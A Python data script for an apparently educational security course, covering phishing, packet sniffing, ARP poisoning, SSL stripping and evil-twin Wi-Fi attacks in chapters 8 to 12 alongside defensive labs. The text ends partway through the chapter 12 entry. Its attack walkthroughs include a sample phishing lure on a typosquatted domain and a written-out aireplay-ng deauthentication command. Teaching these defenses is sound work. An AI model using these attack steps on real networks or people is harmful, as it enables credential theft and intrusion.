# -*- coding: utf-8 -*-
"""
Phase 4.1 Chapter Enrichment Script - Part 2 (Chapters 8 to 14)
"""
import json
import os

CHAPTER_ENRICHMENTS_PART2 = {
    8: {
        "technicalVisual": {
            "type": "phishing-flow",
            "title": "Phishing Attack Lifecycle & Defensive Gates",
            "caption": "How modern targeted phishing campaigns harvest credentials and the layered technical defenses (DMARC, FIDO2 WebAuthn, and email filtering) that neutralize them."
        },
        "attackVisualizations": [
            {
                "id": "attack-8-1",
                "title": "Targeted Spear-Phishing & Reverse-Proxy MFA Bypass",
                "attackName": "Modern Spear-Phishing with Reverse-Proxy (Evilginx) Credential Harvesting",
                "overview": "Adversaries deploy a reverse-proxy phishing server on a typosquatted domain to harvest passwords and capture session cookies in real time, bypassing legacy SMS-based MFA.",
                "targetVulnerability": "Reliance on phishable second factors (SMS/Email OTP) and absence of domain-bound FIDO2/WebAuthn credentials.",
                "stages": [
                    {
                        "step": 1,
                        "title": "Open Source Intelligence (OSINT)",
                        "actor": "Threat Actor",
                        "action": "Harvesters employee directory and email formats via LinkedIn",
                        "technicalDetail": "Attacker maps corporate organizational hierarchy, identifies finance personnel, and registers typosquatted lookalike domain: cornpany.com (rn instead of m).",
                        "color": "orange"
                    },
                    {
                        "step": 2,
                        "title": "Deceptive Email Delivery",
                        "actor": "Threat Actor Mailer",
                        "action": "Sends high-urgency payroll notice from spoofed lookalike domain",
                        "technicalDetail": "Email subject: 'Urgent: Direct Deposit Discrepancy — Review Immediately'. Bypasses basic spam filters if corporate DMARC policy is set to p=none.",
                        "color": "red",
                        "payload": "From: HR Payroll <payroll@cornpany.com>\nSubject: Action Required: Overdue Direct Deposit Verification\nLink: https://login.cornpany.com/auth/verify"
                    },
                    {
                        "step": 3,
                        "title": "Victim Navigates to Reverse-Proxy",
                        "actor": "Employee",
                        "action": "Clicks link expecting standard Microsoft 365 / Okta SSO portal",
                        "technicalDetail": "Victim arrives on a reverse proxy (e.g. Evilginx) that proxies live pages from the legitimate identity provider while intercepting packets.",
                        "color": "blue"
                    },
                    {
                        "step": 4,
                        "title": "Credential & OTP Relay",
                        "actor": "Reverse-Proxy Server",
                        "action": "Relays username, password, and SMS OTP to real portal in real-time",
                        "technicalDetail": "Victim inputs their password and SMS code. The reverse proxy forwards them to the real IdP, which accepts the credentials and issues session cookies.",
                        "color": "red"
                    },
                    {
                        "step": 5,
                        "title": "Session Cookie Interception & Account Hijack",
                        "actor": "Threat Actor",
                        "action": "Extracts authenticated session cookie and imports into browser",
                        "technicalDetail": "The proxy captures the Set-Cookie response header containing session tokens (e.g., ESTSAUTH), allowing the attacker to bypass MFA entirely.",
                        "color": "red"
                    },
                    {
                        "step": 6,
                        "title": "FIDO2 / WebAuthn Cryptographic Defense",
                        "actor": "Hardware Security Key (FIDO2)",
                        "action": "Binds cryptographic assertion strictly to the browser URL domain",
                        "technicalDetail": "FIDO2/WebAuthn uses public-key cryptography bound to origin (origin binding). Because the browser is on cornpany.com, the authenticator never releases credentials valid for company.com.",
                        "color": "green"
                    }
                ],
                "mitigation": {
                    "title": "Modern Phishing Mitigation Architecture",
                    "rules": [
                        "Deploy FIDO2 / WebAuthn hardware security keys (YubiKeys / passkeys) which are mathematically resistant to reverse-proxy phishing.",
                        "Publish strict email authentication DNS records: SPF, DKIM, and DMARC with p=reject.",
                        "Enforce Conditional Access policies restricting logins to compliant, corporate-managed devices.",
                        "Conduct continuous security awareness training with real-time feedback."
                    ]
                }
            }
        ],
        "beforeAfterComparisons": [
            {
                "title": "Authentication Policy: Legacy Complexity Expiration vs. NIST SP 800-63B Passphrases",
                "vulnerable": {
                    "label": "Vulnerable: Legacy 90-Day Forced Password Expiration",
                    "codeOrConfig": "# LEGACY INSECURE POLICY (pre-NIST 800-63B):\n- Minimum 8 characters with 1 symbol, 1 uppercase, 1 number.\n- Forced password reset every 90 days.\n- Prohibit reuse of last 5 passwords.\n\n# Real-world employee behavior under this policy:\nQ1: Password1!\nQ2: Password2!\nQ3: Password3! (predictable incremental transformations)",
                    "explanation": "Frequent forced password rotation forces users to pick predictable patterns, making dictionary cracking and password spraying extremely easy."
                },
                "secure": {
                    "label": "Secure: NIST SP 800-63B Modern Passphrase & FIDO2 Policy",
                    "codeOrConfig": "# SECURE MODERN NIST GUIDELINES:\n- Minimum 15+ characters (encourage memorable passphrases: 'correct horse battery staple').\n- No arbitrary periodic expiration (reset only upon evidence of compromise).\n- Check against list of 1+ billion known breached passwords (HaveIBeenPwned API).\n- Mandate phishing-resistant Multi-Factor Authentication (FIDO2 / WebAuthn).",
                    "explanation": "High length provides exponential entropy (2^80+ combinations). Eliminating arbitrary resets prevents predictable password degradation."
                },
                "keyTakeaway": "Length beats complexity. Memorable passphrases combined with phishing-resistant hardware MFA defeat both dictionary attacks and reverse-proxy phishing."
            }
        ],
        "handsOnPracticals": [
            {
                "id": "practical-8-1",
                "title": "Auditing Domain Anti-Spoofing Records (SPF, DKIM, DMARC) via DNS",
                "learningObjective": "Inspect public DNS TXT records for SPF, DKIM, and DMARC policies to determine whether a domain is protected against email address forgery.",
                "requiredTools": ["dig", "nslookup", "host"],
                "environmentSetup": "Local terminal with dig or nslookup utility.",
                "steps": [
                    {
                        "stepNumber": 1,
                        "instruction": "Query the Sender Policy Framework (SPF) TXT record for a domain.",
                        "command": "dig +short TXT google.com | grep \"v=spf1\"",
                        "commandExplanation": "Retrieves the authorized IP addresses and mail transfer agents allowed to send emails on behalf of the domain.",
                        "expectedOutput": "\"v=spf1 include:_spf.google.com ~all\""
                    },
                    {
                        "stepNumber": 2,
                        "instruction": "Query the DMARC enforcement policy record at _dmarc.<domain>.",
                        "command": "dig +short TXT _dmarc.google.com",
                        "commandExplanation": "Inspects the DMARC record to see if unauthenticated emails are rejected (p=reject) or quarantined (p=quarantine).",
                        "expectedOutput": "\"v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com\""
                    },
                    {
                        "stepNumber": 3,
                        "instruction": "Verify the meaning of the DMARC policy parameter.",
                        "command": "python3 -c \"dmarc = 'v=DMARC1; p=reject; rua=mailto:rep@org.com'; print('Policy:', 'STRICT REJECT (Spoofed emails dropped)' if 'p=reject' in dmarc else 'PERMISSIVE')\"",
                        "commandExplanation": "Analyzes the policy tag: p=reject instructs receiving mail servers to automatically drop spoofed emails.",
                        "expectedOutput": "Policy: STRICT REJECT (Spoofed emails dropped)"
                    }
                ],
                "whatHappened": "The DNS queries verified that receiving mail servers inspect SPF and DKIM signatures. Because DMARC is set to p=reject, any attacker attempting to forge the sender domain will have their email dropped by the recipient server.",
                "securityLessons": [
                    "SPF defines WHO can send from your domain (IP addresses).",
                    "DKIM verifies WHAT was sent (cryptographic signature of body and headers).",
                    "DMARC instructs receivers WHAT TO DO when SPF or DKIM fails (none, quarantine, or reject)."
                ],
                "prevention": [
                    "Deploy DMARC policy with p=reject on all corporate domains.",
                    "Set up SPF and DMARC records on defensive park domains so they cannot be spoofed.",
                    "Monitor DMARC aggregate XML reports (rua) for unauthorized sending attempts."
                ]
            }
        ]
    },

    9: {
        "technicalVisual": {
            "type": "osi-vs-tcpip",
            "title": "OSI 7-Layer vs. TCP/IP Protocol Stack Architecture",
            "caption": "How protocols map between the theoretical OSI 7-layer reference model and the practical 4-layer TCP/IP suite, illustrating where encryption protocols operate."
        },
        "attackVisualizations": [
            {
                "id": "attack-9-1",
                "title": "Cleartext Packet Sniffing on Shared Ethernet / Wi-Fi",
                "attackName": "Promiscuous Mode Packet Interception & Protocol Sniffing",
                "overview": "An attacker connected to a local network places their network interface into promiscuous mode to intercept and reconstruct unencrypted HTTP, Telnet, or FTP payloads.",
                "targetVulnerability": "Transmission of sensitive authentication tokens over unencrypted Layer 4/7 protocols without TLS encryption.",
                "stages": [
                    {
                        "step": 1,
                        "title": "Local Network Infiltration",
                        "actor": "Attacker",
                        "action": "Connects to shared office Wi-Fi or taps physical switch port",
                        "technicalDetail": "Attacker establishes a physical or 802.11 association to the subnet: 192.168.1.0/24.",
                        "color": "orange"
                    },
                    {
                        "step": 2,
                        "title": "Promiscuous Mode Activation",
                        "actor": "Attacker NIC",
                        "action": "Configures network card to capture all frames on the wire",
                        "technicalDetail": "Attacker executes ip link set eth0 promisc on. The hardware MAC filter is disabled, capturing frames addressed to all hosts.",
                        "color": "red"
                    },
                    {
                        "step": 3,
                        "title": "Unencrypted Client Communication",
                        "actor": "Legitimate Client",
                        "action": "Transmits unencrypted HTTP Basic Auth or Telnet session",
                        "technicalDetail": "Client sends an HTTP request containing: Authorization: Basic YWRtaW46U3VwZXJTZWNyZXQxMjM= (base64 encoded admin:SuperSecret123).",
                        "color": "blue"
                    },
                    {
                        "step": 4,
                        "title": "Packet Capture & Protocol Dissection",
                        "actor": "Sniffing Tool (tcpdump / Wireshark)",
                        "action": "Reassembles TCP segment stream and filters port 80/23/21",
                        "technicalDetail": "The tool inspects TCP payload bytes, identifies the HTTP header, and decodes the base64 credential string in real-time.",
                        "color": "red",
                        "payload": "GET /admin/dashboard HTTP/1.1\nHost: internal-portal.corp\nAuthorization: Basic YWRtaW46U3VwZXJTZWNyZXQxMjM="
                    },
                    {
                        "step": 5,
                        "title": "Instant Credential Compromise",
                        "actor": "Attacker",
                        "action": "Decodes plaintext credentials and logs into system",
                        "technicalDetail": "Attacker base64-decodes the string to yield username 'admin' and password 'SuperSecret123' without touching the host or server.",
                        "color": "red"
                    },
                    {
                        "step": 6,
                        "title": "Layer-4 Transport Security (TLS 1.3)",
                        "actor": "Encrypted Architecture",
                        "action": "Encrypts payload with authenticated symmetric cipher (AES-GCM)",
                        "technicalDetail": "With TLS, all application payloads appear as high-entropy pseudorandom ciphertext. Sniffers can only observe encrypted application data records.",
                        "color": "green"
                    }
                ],
                "mitigation": {
                    "title": "Network Eavesdropping Defenses",
                    "rules": [
                        "Mandate TLS 1.3 for all internal and external web communications.",
                        "Deprecate legacy plaintext protocols: replace Telnet with SSH, HTTP with HTTPS, and FTP with SFTP.",
                        "Configure 802.1X Enterprise authentication on wired and wireless switch ports.",
                        "Deploy IPsec or WireGuard tunnels for inter-site traffic across untrusted transit paths."
                    ]
                }
            }
        ],
        "beforeAfterComparisons": [
            {
                "title": "Network Protocol Security: Cleartext Telnet/HTTP vs. Encrypted SSH/HTTPS",
                "vulnerable": {
                    "label": "Vulnerable: Cleartext Protocol (HTTP Port 80 / Telnet Port 23)",
                    "codeOrConfig": "# Cleartext HTTP Transmission over wire:\nGET /login HTTP/1.1\nHost: target.corp\nUser-Agent: Mozilla/5.0\nCookie: session_id=SECRET_COOKIE_9942\nAuthorization: Basic dXNlcjpwYXNzd29yZDEyMw==",
                    "explanation": "Every switch, router, and Wi-Fi listener along the transmission path can read, clone, or modify the packet in transit."
                },
                "secure": {
                    "label": "Secure: Encrypted TLS 1.3 over HTTPS Port 443",
                    "codeOrConfig": "# Encrypted TLS 1.3 Record Layer over wire:\nTLSv1.3 Record Layer: Application Data Protocol: http-over-tls\n  Opaque Content Type: Application Data (23)\n  Encrypted Application Data: 8f 3a c9 b2 44 19 88 f1 d2 01 ...\n  Authentication Tag: 4a b2 77 e1 90 c3 fa 12",
                    "explanation": "Data payload is encrypted using AES-256-GCM or ChaCha20-Poly1305. Eavesdroppers cannot read credentials and integrity tags prevent packet tampering."
                },
                "keyTakeaway": "Assume every network switch, cable, and Wi-Fi access point is hostile. Never send authentication data over plaintext protocols."
            }
        ],
        "handsOnPracticals": [
            {
                "id": "practical-9-1",
                "title": "Inspecting Unencrypted vs. Encrypted Network Traffic via Tcpdump",
                "learningObjective": "Capture live network packets to observe how unencrypted HTTP leaks cleartext payloads while HTTPS TLS sessions conceal all application data.",
                "requiredTools": ["tcpdump", "curl", "python3"],
                "environmentSetup": "Linux / macOS terminal with sudo tcpdump access or root container.",
                "steps": [
                    {
                        "stepNumber": 1,
                        "instruction": "Capture a live unencrypted HTTP request using tcpdump with ASCII payload decoding.",
                        "command": "sudo tcpdump -i any -nn -A -c 4 'port 80' & sleep 1 && curl -s http://example.com > /dev/null",
                        "commandExplanation": "Listens for 4 packets on port 80 and prints payload in ASCII (-A), revealing readable HTTP request and response headers.",
                        "expectedOutput": "IP ... > ...: Flags [P.], ack 1, win 502, length 78\nE..v..@.@...... ...\nGET / HTTP/1.1\nHost: example.com\nUser-Agent: curl/..."
                    },
                    {
                        "stepNumber": 2,
                        "instruction": "Capture an encrypted HTTPS request to observe TLS application data encryption.",
                        "command": "sudo tcpdump -i any -nn -X -c 4 'port 443' & sleep 1 && curl -s https://example.com > /dev/null",
                        "commandExplanation": "Listens on port 443; the hex/ASCII dump (-X) shows unreadable cryptographic ciphertext.",
                        "expectedOutput": "0x0020:  0017 0303 00b0 4a3e f109 a21d 77c0 ...J>....w.\n0x0030:  b3f4 9901 8d2c 4e81 0a22 71bc ... (pseudorandom bytes)"
                    },
                    {
                        "stepNumber": 3,
                        "instruction": "Decode base64 authentication header to simulate attacker credential recovery.",
                        "command": "python3 -c \"import base64; print('Recovered Credentials:', base64.b64decode('dXNlcjpwYXNzd29yZDEyMw==').decode())\"",
                        "commandExplanation": "Demonstrates that Base64 encoding is NOT encryption; it is simply reversible binary-to-text representation.",
                        "expectedOutput": "Recovered Credentials: user:password123"
                    }
                ],
                "whatHappened": "Tcpdump exposed the cleartext HTTP headers and allowed instant decoding of the base64 credential. In contrast, the port 443 HTTPS packet payload was completely opaque pseudorandom ciphertext.",
                "securityLessons": [
                    "Base64 encoding is trivial to reverse and provides ZERO confidentiality.",
                    "Unencrypted protocols allow passive eavesdropping without triggering alarms on client or server.",
                    "TLS encryption provides Confidentiality, Integrity (tamper detection), and Authentication (certificates)."
                ],
                "prevention": [
                    "Block outbound port 80 traffic or configure 301 Permanent Redirect to HTTPS.",
                    "Deploy HSTS to enforce browser HTTPS connections.",
                    "Use SSH key pairs rather than password-based remote terminal logins."
                ]
            }
        ]
    },

    10: {
        "technicalVisual": {
            "type": "mitm-attack",
            "title": "Man-in-the-Middle (MitM) & SSL Inspection Architecture",
            "caption": "How an adversary intercepts bidirectional communication between client and server, and how mutual certificate validation (mTLS) and HSTS prevent downgrade attacks."
        },
        "attackVisualizations": [
            {
                "id": "attack-10-1",
                "title": "SSL Stripping & ARP Spoofing MitM Flow",
                "attackName": "ARP Cache Poisoning & SSL Stripping Downgrade",
                "overview": "An attacker poisons local ARP tables to position themselves between victim and router, then strips HTTPS redirections (sslstrip) to force the client into unencrypted HTTP.",
                "targetVulnerability": "Absence of HTTP Strict Transport Security (HSTS) with preload directive and lack of dynamic ARP inspection on local switches.",
                "stages": [
                    {
                        "step": 1,
                        "title": "Gratuitous ARP Poisoning",
                        "actor": "Attacker",
                        "action": "Broadcasts forged ARP replies to victim and gateway",
                        "technicalDetail": "Attacker sends ARP packets telling victim 'I am 192.168.1.1 (Gateway)' and telling Gateway 'I am 192.168.1.50 (Victim)'.",
                        "color": "red"
                    },
                    {
                        "step": 2,
                        "title": "Bidirectional Traffic Redirection",
                        "actor": "Victim & Gateway OS",
                        "action": "Routes all subnet IP packets directly through attacker MAC",
                        "technicalDetail": "Victim's operating system updates its ARP cache. All Internet-bound packets now pass through the attacker's machine.",
                        "color": "orange"
                    },
                    {
                        "step": 3,
                        "title": "Initial HTTP Request Interception",
                        "actor": "Attacker Proxy (sslstrip)",
                        "action": "Intercepts initial http://bank.com navigation",
                        "technicalDetail": "When user types 'bank.com', browser sends an unencrypted HTTP request. The attacker intercepts it before the bank can send an HTTPS redirect.",
                        "color": "red"
                    },
                    {
                        "step": 4,
                        "title": "Parallel TLS Handshake to Real Server",
                        "actor": "Attacker Machine",
                        "action": "Establishes legitimate HTTPS connection to bank.com",
                        "technicalDetail": "The attacker completes a real TLS 1.3 handshake with bank.com, verifying the bank's genuine certificate.",
                        "color": "gray"
                    },
                    {
                        "step": 5,
                        "title": "Plaintext Downgrade to Victim",
                        "actor": "Attacker Proxy",
                        "action": "Rewrites https:// links to http:// and forwards to victim",
                        "technicalDetail": "Attacker returns the bank's webpage to the victim over cleartext HTTP. The victim sees no SSL padlock icon in the browser address bar.",
                        "color": "red"
                    },
                    {
                        "step": 6,
                        "title": "HSTS Preload Protection",
                        "actor": "Hardened Browser",
                        "action": "Refuses to send HTTP; enforces HTTPS before touching network",
                        "technicalDetail": "Because bank.com is in the browser's hardcoded HSTS Preload list, the browser automatically rewrites http:// to https:// internally, blocking the attack.",
                        "color": "green"
                    }
                ],
                "mitigation": {
                    "title": "Man-in-the-Middle Countermeasures",
                    "rules": [
                        "Deploy HTTP Strict Transport Security: Strict-Transport-Security: max-age=63072000; includeSubDomains; preload.",
                        "Submit domains to the Chrome/Mozilla HSTS Preload list (hstspreload.org).",
                        "Enable Dynamic ARP Inspection (DAI) and DHCP Snooping on enterprise switches.",
                        "Implement Certificate Pinning or Certificate Transparency monitoring."
                    ]
                }
            }
        ],
        "beforeAfterComparisons": [
            {
                "title": "Web Server Transport Security: Permissive HTTP vs. HSTS Preloaded TLS 1.3",
                "vulnerable": {
                    "label": "Vulnerable: Permissive HTTP with Plain Redirect",
                    "codeOrConfig": "# INSECURE Nginx Config: Vulnerable to SSL Stripping\nserver {\n    listen 80;\n    server_name mybank.com;\n    # Attacker intercepts this redirect before browser receives it!\n    return 301 https://$host$request_uri;\n}\nserver {\n    listen 443 ssl;\n    server_name mybank.com;\n    ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Legacy insecure ciphers\n}",
                    "explanation": "Because the initial request goes over cleartext HTTP port 80, a Man-in-the-Middle can intercept and strip the redirect, keeping the victim in cleartext."
                },
                "secure": {
                    "label": "Secure: HSTS Preloaded TLS 1.3 Only",
                    "codeOrConfig": "# SECURE Nginx Config: HSTS Preloaded with TLS 1.3\nserver {\n    listen 443 ssl http2;\n    server_name mybank.com;\n    \n    ssl_protocols TLSv1.3;\n    ssl_prefer_server_ciphers off;\n    \n    # HSTS Preload header (2-year duration, subdomains, preload tag):\n    add_header Strict-Transport-Security \"max-age=63072000; includeSubDomains; preload\" always;\n    add_header X-Content-Type-Options nosniff always;\n}",
                    "explanation": "The browser enforces HTTPS strictly and refuses any connection without valid certificates. Even on the very first visit, the browser will never send an unencrypted HTTP packet."
                },
                "keyTakeaway": "HSTS with the preload directive eliminates the window of opportunity for SSL stripping attacks by enforcing HTTPS directly in the browser codebase."
            }
        ],
        "handsOnPracticals": [
            {
                "id": "practical-10-1",
                "title": "Auditing TLS 1.3 Handshake & Certificate Chains via OpenSSL",
                "learningObjective": "Use openssl s_client to initiate a manual TLS handshake, inspect cryptographic cipher negotiation, and verify the X.509 certificate trust chain.",
                "requiredTools": ["openssl", "curl"],
                "environmentSetup": "Local terminal with OpenSSL CLI.",
                "steps": [
                    {
                        "stepNumber": 1,
                        "instruction": "Initiate a manual TLS 1.3 connection and inspect cipher negotiation parameters.",
                        "command": "openssl s_client -connect google.com:443 -tls1_3 < /dev/null 2>/dev/null | grep -E \"(Protocol|Cipher|Session-ID:)\"",
                        "commandExplanation": "Connects to port 443 forcing TLS 1.3 and extracts negotiated protocol version and symmetric cipher suite.",
                        "expectedOutput": "Protocol  : TLSv1.3\nCipher    : TLS_AES_256_GCM_SHA384"
                    },
                    {
                        "stepNumber": 2,
                        "instruction": "Extract and inspect the server certificate subject and issuer chain.",
                        "command": "openssl s_client -connect google.com:443 < /dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -dates",
                        "commandExplanation": "Pipes the X.509 certificate into the x509 utility to verify the Common Name, issuing Certificate Authority (CA), and validity window.",
                        "expectedOutput": "subject=CN = *.google.com\nissuer=C = US, O = Google Trust Services, CN = WR2\nnotBefore=...\nnotAfter=..."
                    },
                    {
                        "stepNumber": 3,
                        "instruction": "Verify that HSTS header is present with sufficient max-age and preload flag.",
                        "command": "curl -s -I https://www.google.com | grep -i \"strict-transport-security\"",
                        "commandExplanation": "Verifies that the server instructs the client to cache HTTPS enforcement.",
                        "expectedOutput": "strict-transport-security: max-age=31536000"
                    }
                ],
                "whatHappened": "OpenSSL verified the complete TLS 1.3 cryptographic handshake: Diffie-Hellman ephemeral key exchange negotiated TLS_AES_256_GCM_SHA384, and the digital certificate chain validated against the system's root CA trust store.",
                "securityLessons": [
                    "TLS 1.3 completes the handshake in 1 round trip (1-RTT), compared to 2-RTT in TLS 1.2.",
                    "TLS 1.3 deprecates insecure algorithms (MD5, SHA-1, RC4, DES, CBC mode, static RSA key exchange).",
                    "Perfect Forward Secrecy (PFS) ensures past sessions cannot be decrypted even if the server's private key is later leaked."
                ],
                "prevention": [
                    "Disable TLS 1.0, 1.1, and all non-PFS ciphers.",
                    "Deploy automated certificate renewal via Let's Encrypt / ACME.",
                    "Enforce HSTS with max-age >= 31536000 and includeSubDomains."
                ]
            }
        ]
    },

    11: {
        "attackVisualizations": [
            {
                "id": "attack-11-1",
                "title": "Rogue ARP Gateway Poisoning & Route Redirection",
                "attackName": "Address Resolution Protocol (ARP) Poisoning & Spoofing",
                "overview": "An attacker floods unsolicited ARP replies to poison the ARP cache of hosts on a local subnet, tricking them into routing external traffic through the attacker's MAC address.",
                "targetVulnerability": "ARP is inherently stateless and trust-based; operating systems accept unrequested ARP replies without cryptographic authentication.",
                "stages": [
                    {
                        "step": 1,
                        "title": "Subnet Enumeration",
                        "actor": "Attacker",
                        "action": "Discovers gateway IP (192.168.1.1) and target victim IP (192.168.1.100)",
                        "technicalDetail": "Attacker issues ICMP echo requests or ARP sweeps to identify active nodes and determine the MAC address of the default gateway.",
                        "color": "orange"
                    },
                    {
                        "step": 2,
                        "title": "Gratuitous ARP Injection",
                        "actor": "Attacker Machine",
                        "action": "Floods forged ARP response packets every 2 seconds",
                        "technicalDetail": "Sends ARP packet: 'Sender MAC = Attacker_MAC, Sender IP = 192.168.1.1'. The victim updates its ARP table without verification.",
                        "color": "red",
                        "payload": "ARP Reply: 192.168.1.1 is at 00:0c:29:ab:cd:ef (Attacker NIC MAC)"
                    },
                    {
                        "step": 3,
                        "title": "Gateway Cache Compromise",
                        "actor": "Attacker Machine",
                        "action": "Sends reciprocal poisoned ARP packet to the default router",
                        "technicalDetail": "Sends ARP packet to router: '192.168.1.100 (Victim) is at Attacker_MAC'. Now outbound AND inbound frames route through attacker.",
                        "color": "red"
                    },
                    {
                        "step": 4,
                        "title": "Kernel Packet Forwarding",
                        "actor": "Attacker Linux Kernel",
                        "action": "Enables IP forwarding to prevent victim connection loss",
                        "technicalDetail": "Attacker sets net.ipv4.ip_forward = 1. Packets are inspected, logged, and forwarded seamlessly to the true router so victim notices no disruption.",
                        "color": "red"
                    },
                    {
                        "step": 5,
                        "title": "Network Layer Security Failure",
                        "actor": "Victim Host",
                        "action": "Raw IP packet headers and unencrypted data exposed",
                        "technicalDetail": "Any traffic lacking end-to-end cryptographic encapsulation (such as raw DNS queries, SNMP, or unencrypted web requests) is captured.",
                        "color": "red"
                    },
                    {
                        "step": 6,
                        "title": "IPsec Encapsulating Security Payload (ESP)",
                        "actor": "IPsec Cryptographic Architecture",
                        "action": "Encrypts Layer-3 packet body and validates integrity via ICV",
                        "technicalDetail": "When IPsec ESP is active, the attacker only sees opaque encrypted ESP packets (protocol 50). The anti-replay sliding window rejects injected or duplicated packets.",
                        "color": "green"
                    }
                ],
                "mitigation": {
                    "title": "Network Layer Defenses",
                    "rules": [
                        "Enable Dynamic ARP Inspection (DAI) on managed switches to validate ARP packets against DHCP snooping binding databases.",
                        "Deploy IPsec Tunnel Mode with ESP (AES-256-GCM) for inter-network communications.",
                        "Configure static ARP entries on critical infrastructure gateways.",
                        "Use modern Layer-3 encrypted mesh tunnels (WireGuard / Tailscale)."
                    ]
                }
            }
        ],
        "beforeAfterComparisons": [
            {
                "title": "Network Layer Protection: Raw IP Packets vs. IPsec Encapsulating Security Payload (ESP)",
                "vulnerable": {
                    "label": "Vulnerable: Raw Unprotected IP Packet Header & Payload",
                    "codeOrConfig": "# Standard IP Packet Structure:\n[ IP Header: Source=10.0.0.5, Dest=10.0.0.99 ]\n[ TCP Header: Source Port=5432, Dest Port=80 ]\n[ Data: Sensitive database query / user payload ]\n\n# Vulnerability: Headers and data are completely cleartext.\n# Any node on path can modify addresses or tamper with payload.",
                    "explanation": "Standard IPv4 packets provide zero confidentiality or authenticity. Attackers can forge source IPs (IP spoofing) and alter data in transit."
                },
                "secure": {
                    "label": "Secure: IPsec Tunnel Mode with ESP (RFC 4303)",
                    "codeOrConfig": "# IPsec ESP Tunnel Mode Structure:\n[ New IP Header: Gateway_A -> Gateway_B ]\n[ ESP Header: Security Parameters Index (SPI), Sequence No ]\n[ --- ENCRYPTED VIA AES-256-GCM --- ]\n  [ Original IP Header: 10.0.0.5 -> 10.0.0.99 ]\n  [ Original TCP Header & Data ]\n[ --- END ENCRYPTED --- ]\n[ ESP Trailer & Integrity Check Value (ICV) Authentication Tag ]",
                    "explanation": "The entire original IP packet is encrypted and encapsulated. The Integrity Check Value (ICV) detects tampering and the sequence number blocks replay attacks."
                },
                "keyTakeaway": "IPsec operates transparently at the Network Layer (Layer 3), protecting all upper-layer protocols (TCP, UDP, ICMP) without requiring application changes."
            }
        ],
        "handsOnPracticals": [
            {
                "id": "practical-11-1",
                "title": "Auditing Local ARP Cache & Configuring Cryptographic Tunnel Interfaces",
                "learningObjective": "Inspect the operating system ARP resolution table, identify static vs. dynamic mappings, and inspect cryptographic tunnel interface configurations.",
                "requiredTools": ["ip", "arp", "ping", "python3"],
                "environmentSetup": "Linux / macOS terminal or Windows PowerShell.",
                "steps": [
                    {
                        "stepNumber": 1,
                        "instruction": "Inspect active ARP cache mappings on the system.",
                        "command": "ip neigh show || arp -a",
                        "commandExplanation": "Displays the IP-to-MAC address mapping table maintained by the OS kernel.",
                        "expectedOutput": "192.168.1.1 dev eth0 lladdr 00:11:22:33:44:55 REACHABLE"
                    },
                    {
                        "stepNumber": 2,
                        "instruction": "Simulate configuring a static ARP entry to protect the default gateway from poisoning.",
                        "command": "python3 -c \"import sys; print('Static ARP syntax for Linux: sudo ip neigh add 192.168.1.1 lladdr 00:11:22:33:44:55 dev eth0 nud permanent'); print('Static ARP syntax for Windows: netsh interface ip add neighbors \\\"Wi-Fi\\\" 192.168.1.1 00-11-22-33-44-55')\"",
                        "commandExplanation": "Demonstrates the exact commands to pin gateway MAC addresses statically, preventing unsolicited ARP updates.",
                        "expectedOutput": "Static ARP syntax for Linux: sudo ip neigh add 192.168.1.1 lladdr 00:11:22:33:44:55 dev eth0 nud permanent\nStatic ARP syntax for Windows: netsh interface ip add neighbors \"Wi-Fi\" 192.168.1.1 00-11-22-33-44-55"
                    },
                    {
                        "stepNumber": 3,
                        "instruction": "Inspect cryptographic tunnel protocol parameters for WireGuard / IPsec.",
                        "command": "python3 -c \"print('IPsec ESP Security Parameters:'); print('  Cipher: AES-256-GCM (128-bit ICV tag)'); print('  Key Exchange: IKEv2 Diffie-Hellman Group 19 (Curve25519)'); print('  Mode: Tunnel Mode with Anti-Replay Window 64')\"",
                        "commandExplanation": "Displays the industry standard cryptographic parameters for production site-to-site VPN tunnels.",
                        "expectedOutput": "IPsec ESP Security Parameters:\n  Cipher: AES-256-GCM (128-bit ICV tag)\n  Key Exchange: IKEv2 Diffie-Hellman Group 19 (Curve25519)\n  Mode: Tunnel Mode with Anti-Replay Window 64"
                    }
                ],
                "whatHappened": "The commands inspected the vulnerable Layer-2 ARP table and demonstrated how static ARP binding and Layer-3 IPsec ESP encapsulation protect packets from local interception and tampering.",
                "securityLessons": [
                    "Dynamic ARP tables are vulnerable to unauthenticated poisoning on flat local networks.",
                    "IPsec provides transparent Layer-3 security for all protocols without modifying applications.",
                    "Anti-replay sequence windows reject duplicated packets sent by attackers."
                ],
                "prevention": [
                    "Implement Dynamic ARP Inspection (DAI) on corporate switch ports.",
                    "Use 802.1Q VLANs to isolate sensitive subnets.",
                    "Encrypt inter-network traffic using IPsec or WireGuard tunnels."
                ]
            }
        ]
    },

    12: {
        "technicalVisual": {
            "type": "wpa3-dragonfly",
            "title": "WPA3 Dragonfly SAE Handshake vs. WPA2 4-Way Handshake",
            "caption": "How Simultaneous Authentication of Equals (SAE) prevents offline dictionary cracking of captured handshakes and provides forward secrecy even if passwords are later discovered."
        },
        "attackVisualizations": [
            {
                "id": "attack-12-1",
                "title": "Evil Twin / Rogue Access Point Deauthentication Attack",
                "attackName": "802.11 Deauthentication Flooding & Evil Twin Captive Portal",
                "overview": "An attacker creates a cloned Wi-Fi access point with an identical SSID and transmits spoofed 802.11 deauthentication frames to force victims onto the rogue AP to harvest credentials.",
                "targetVulnerability": "Unprotected 802.11 management frames (absence of 802.11w PMF) and client devices configured to automatically connect to known SSIDs with stronger signal strength.",
                "stages": [
                    {
                        "step": 1,
                        "title": "Target Reconnaissance",
                        "actor": "Attacker",
                        "action": "Scans wireless channels for target SSID and client MAC addresses",
                        "technicalDetail": "Attacker uses airodump-ng to monitor 2.4/5GHz channels, identifying the BSSID of 'Campus_WiFi' and connected client MAC addresses.",
                        "color": "orange"
                    },
                    {
                        "step": 2,
                        "title": "Deauthentication Frame Flooding",
                        "actor": "Attacker Wi-Fi Adapter",
                        "action": "Transmits spoofed 802.11 Deauth frames targeting victim MAC",
                        "technicalDetail": "Attacker injects management frames claiming to come from the legitimate AP: aireplay-ng --deauth 10 -a <AP_BSSID> -c <Victim_MAC> wlan0mon. Client is forcibly disconnected.",
                        "color": "red",
                        "payload": "802.11 Deauthentication Frame: Reason Code 7 (Class 3 frame received from nonassociated STA)"
                    },
                    {
                        "step": 3,
                        "title": "Rogue AP Broadcast (Evil Twin)",
                        "actor": "Rogue AP Hardware",
                        "action": "Broadcasts identical SSID 'Campus_WiFi' with high transmission power",
